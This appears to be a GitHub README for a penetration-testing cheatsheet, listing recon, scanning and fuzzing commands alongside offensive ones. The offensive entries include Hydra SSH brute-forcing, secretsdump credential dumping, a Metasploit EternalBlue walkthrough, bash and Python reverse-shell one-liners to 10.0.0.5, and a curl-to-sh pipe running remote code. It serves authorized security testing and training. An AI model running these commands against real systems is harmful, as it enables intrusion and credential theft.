# Penetration Testing & Vulnerability Research Cheatsheet 🛡️

[![Live demo](https://img.shields.io/badge/demo-online-brightgreen)](https://hackerscheatsheet.onrender.com/)

**Practical, searchable command reference for recon, scanning, fuzzing, reversing, and exploitation.**
**Intended for authorized use only** — educational, defensive hardening, and professional security testing/lab environments.

---

> 🚨 **IMPORTANT: AUTHORIZED USE ONLY**
> Do **not** run these commands against systems you do not own or for which you do not have **explicit written authorization** from the asset owner. Misuse is illegal and unethical.

---

## Contents

1. [Overview & Safety](#overview--safety)
2. [Live Demo](#live-demo)
3. [Quick Usage](#quick-usage)
4. [Cheatsheet (by topic)](#cheatsheet-by-topic)
   * [1) Recon & OSINT](#1-recon--osint)
   * [2) Subdomain & DNS Enumeration](#2-subdomain--dns-enumeration)
   * [3) Port & Service Discovery](#3-port--service-discovery)
   * [4) Web Discovery & Fuzzing](#4-web-discovery--fuzzing)
   * [5) Web Application Testing](#5-web-application-testing)
   * [6) Vulnerability Scanning & SCA](#6-vulnerability-scanning--sca)
   * [7) Passwords, Credentials & AD Tooling](#7-passwords-credentials--ad-tooling)
   * [8) Exploitation: Metasploit Framework (MSF)](#8-exploitation-metasploit-framework-msf)
   * [9) Post-Exploitation: Shells & Enumeration](#9-post-exploitation-shells--enumeration)
   * [10) Network & TLS Checks](#10-network--tls-checks)
   * [11) Vulnerability Research & PoC Triage](#11-vulnerability-research--poc-triage)
   * [12) Binary Reversing & Exploit Development](#12-binary-reversing--exploit-development)
   * [13) Fuzzing](#13-fuzzing)
   * [14) Mobile & Firmware Analysis](#14-mobile--firmware-analysis)
   * [15) Safe PoC Testing & Logging](#15-safe-poc-testing--logging)
5. [Quick Safety & Research Summary](#quick-safety--research-summary)
6. [Project & Hosting](#project--hosting)
7. [Customization & Contribution](#customization--contribution)
8. [Ethical & Legal Notice](#ethical--legal-notice)
9. [License](#license)

---

## Overview & Safety

This repository contains a compact, command-focused cheatsheet to speed up authorized penetration testing and vulnerability research. It’s designed to be:

* Fully **client-side** and portable (single HTML file option).
* Easy to search and copy commands from.
* Focused on **safe, lab-first** workflows (isolate PoCs, avoid production testing).

Always test PoCs in isolated VMs/containers and keep snapshots. Never expose exploit PoCs or tools to networks that contain production or sensitive systems.

---

## Live Demo

A lightweight, read-only demo of the cheatsheet is available for quick preview:

🔗 **Live demo:** [https://hackerscheatsheet.onrender.com/](https://hackerscheatsheet.onrender.com/)

> The demo is a static, client-side preview of the cheatsheet (HTML/CSS/JS). It is intended for evaluation and quick sharing only — **do not** rely on the demo for internal/private content. Always test PoCs and active tools in isolated lab environments as described in the cheatsheet.

### Note on Content & Security

* The demo hosts only static HTML/CSS/JS without any backend scanning or exploit capability.
* For full local testing, cloning the repo and running `index.html` locally is recommended (see Quick Usage below).

---

## Quick Usage

Local preview (after cloning):

```bash
git clone [https://github.com/](https://github.com/)<your-username>/pentest-cheatsheet.git
cd pentest-cheatsheet
# open index.html in your browser
# macOS
open index.html
# Windows
start index.html
# Linux
xdg-open index.html

Publish with GitHub Pages:
 * Push repository to GitHub.
 * Go to Settings → Pages.
 * Select the main branch and / (root) folder.
 * Save — site will be available at: https://<username>.github.io/pentest-cheatsheet/
Cheatsheet (by topic)
> Note: Replace example.com, 192.0.2.0/24, 10.0.0.5, and other placeholders with real in-scope targets only.
> 
1) Recon & OSINT
# Basic lookups
whois example.com
dig +short example.com A
nslookup -type=mx example.com

# OSINT (AUTHORIZED USE ONLY)
theharvester -d example.com -b google -l 500
shodan host 1.2.3.4

2) Subdomain & DNS Enumeration
# Amass (passive + active + brute)
amass enum -d example.com -o amass.txt

# Subfinder (fast passive)
subfinder -d example.com -o subfinder.txt

# crt.sh (via curl + jq)
curl -s "[https://crt.sh/?q=%25.example.com&output=json](https://crt.sh/?q=%25.example.com&output=json)" | jq -r '.[].name_value' | sort -u

# DNS recon
dnsrecon -d example.com

3) Port & Service Discovery
# Nmap (version, default scripts, full ports)
nmap -sC -sV -p- -T4 --min-rate 1000 -oA nmap-full 192.0.2.0/24

# Host discovery
nmap -sn 192.0.2.0/24

# Banner grab with netcat
nc -vz 192.0.2.10 80
echo | nc 192.0.2.10 25

4) Web Discovery & Fuzzing
# ffuf (directory/file fuzzing)
ffuf -u [https://example.com/FUZZ](https://example.com/FUZZ) -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc 200,301,302 -o ffuf.json

# gobuster (dir + vhost)
gobuster dir -u [https://example.com/](https://example.com/) -w /usr/share/wordlists/dirb/common.txt -t 50 -o gobuster.txt

5) Web Application Testing
# HTTP quick checks
curl -I -L [https://example.com](https://example.com)

# nikto (webserver checks)
nikto -h [https://example.com](https://example.com) -output nikto.txt

# sqlmap (ONLY in-scope & lab)
sqlmap -u "[https://example.com/vuln.php?id=1](https://example.com/vuln.php?id=1)" --batch --dbs

# XSS testing (lab only)
xsstrike -u "[https://example.com/page?param=1](https://example.com/page?param=1)"

# parameter discovery
arjun -u "[https://example.com/page](https://example.com/page)" -o arjun.txt

6) Vulnerability Scanning & SCA
# nuclei (fast templates)
nuclei -l hosts.txt -t cves/ -o nuclei_results.txt

# syft -> generate SBOM
syft packages dir:./project -o json > sbom.json

# grype -> scan SBOM
grype sbom:sbom.json

# query NVD (example)
curl -s "[https://services.nvd.nist.gov/rest/json/cve/1.0/CVE-2021-44228](https://services.nvd.nist.gov/rest/json/cve/1.0/CVE-2021-44228)" | jq .

7) Passwords, Credentials & AD Tooling
# hydra (online bruteforce) - AUTHORIZED ONLY
hydra -L users.txt -P passwords.txt -t 4 ssh://192.0.2.10 -o hydra-ssh.txt

# john / hashcat (offline cracking)
john --wordlist=/usr/share/wordlists/rockyou.txt hashfile.txt
hashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt

# impacket (examples)
python3 /opt/impacket/examples/secretsdump.py domain/USER:PASS -outputfile secrets

# BloodHound collection
Invoke-BloodHound -CollectionMethod All -ZipFileName bloodhound.zip

8) Exploitation: Metasploit Framework (MSF)
# start msfconsole
msfconsole

# search
search cve:2017-0143
search type:exploit platform:windows smb

# use exploit
use exploit/windows/smb/ms17_010_eternalblue

# show/set options
show options
set RHOSTS 192.168.1.0/24
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.0.0.5

# check (non-destructive)
check

# exploit (authorized/lab only)
exploit

9) Post-Exploitation: Shells & Enumeration
# netcat listener (catch reverse shells)
nc -lvnp 4444

# bash reverse shell
bash -i >& /dev/tcp/10.0.0.5/4444 0>&1

# python reverse shell
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'

# linux enumeration (lab)
curl -s [https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh](https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh) | sh

# windows enumeration
.\winpeas.exe

10) Network & TLS Checks
# tcpdump (capture)
tcpdump -i eth0 -w capture.pcap -c 1000

# tshark read
tshark -r capture.pcap -Y "http" -T fields -e http.host -e http.request.uri

# quick cert info
openssl s_client -connect example.com:443 </dev/null 2>/dev/null | openssl x509 -noout -text

# sslyze
sslyze --regular example.com:443

11) Vulnerability Research & PoC Triage
# searchsploit
searchsploit "CVE-2021-44228"
searchsploit -m 49993  # copy exploit by EDB ID

# fetch PoC (read-only)
curl -sL "[https://raw.githubusercontent.com/user/repo/branch/poc.py](https://raw.githubusercontent.com/user/repo/branch/poc.py)" -o /tmp/poc.py

# run PoC inside an isolated, no-network container
docker run --rm -v /tmp/poc.py:/poc/poc.py --network none -it python:3.10 bash -c "python /poc/poc.py"

12) Binary Reversing & Exploit Development
# ELF inspection
readelf -h binary
objdump -d binary | less
strings binary

# radare2
r2 -AA binary

# ropgadget
ropgadget --binary binary --only "pop|ret" > gadgets.txt

# gdb + pwndbg
gdb -q ./binary

13) Fuzzing
# AFL (instrumented binary)
afl-fuzz -i in_dir -o out_dir -- ./target @@

# wfuzz for HTTP
wfuzz -c -z file,/usr/share/wordlists/parameters.txt --hc 404 "[https://example.com/vuln?FUZZ=1](https://example.com/vuln?FUZZ=1)"

14) Mobile & Firmware Analysis
# android decompile / inspect
apktool d app.apk -o app_src
jadx -d out app.apk

# frida (dynamic hooks) - authorized/lab only
frida -U -f com.example.app -l script.js --no-pause

# firmware extraction
binwalk -e firmware.bin
strings firmware.bin | grep -i password

15) Safe PoC Testing & Logging
# isolated container (no external network)
docker run --rm --network none -v $(pwd):/work -it ubuntu:22.04 bash

# spin up target service in container (lab)
docker run --rm -p 8080:80 vuln-app:latest

# logging with timestamps & tool version
(tool --version 2>&1 ; date; tool [args]) |& tee logfile.txt

# save JSON where possible
nuclei -o nuclei.json -oJ nuclei.json
ffuf -o ffuf.json -of json

Quick Safety & Research Summary
 * Isolate testing: always use containers, VMs, and snapshots for exploit/PoC testing.
 * Validate manually: don’t blindly trust scanner outputs. Manually verify.
 * Document everything: CVE IDs, vendor advisories, affected versions, and test logs.
 * Stay legal: obtain explicit, written and current authorization before testing.
Project & Hosting
 * Tech: HTML5 + CSS3 (glassmorphism), Highlight.js for syntax, Vanilla JS for search/copy/export features.
 * File structure (simple single-file option):
   * index.html — main cheatsheet (self-contained)
   * README.md — this file
Customization & Contribution
 * Edit <article> blocks in index.html to add/remove sections.
 * Swap Highlight.js theme in the CDN include.
 * Tweak color variables under :root for instant theme changes.
 * Contributions welcome — open a PR to add tools, templates, or safer workflows.
Suggested Commit & PR
Commit message:
docs: add live demo link and README badge ([https://hackerscheatsheet.onrender.com](https://hackerscheatsheet.onrender.com))

Example git commands:
git checkout -b feat/add-live-demo
# edit README.md and index.html per snippets
git add README.md index.html
git commit -m "docs: add live demo link and README badge ([https://hackerscheatsheet.onrender.com](https://hackerscheatsheet.onrender.com))"
git push origin feat/add-live-demo
# open a PR on GitHub from feat/add-live-demo -> main

Ethical & Legal Notice
This project is intended for authorized penetration testing, lab simulations, and defensive training only. The author assumes no liability for misuse. You are responsible for your own actions.
By using this cheatsheet you confirm you understand and will comply with applicable laws and obtain proper authorization before conducting any active testing.
License
MIT License
Copyright (c) <2025> <Andrey Lopukhov>
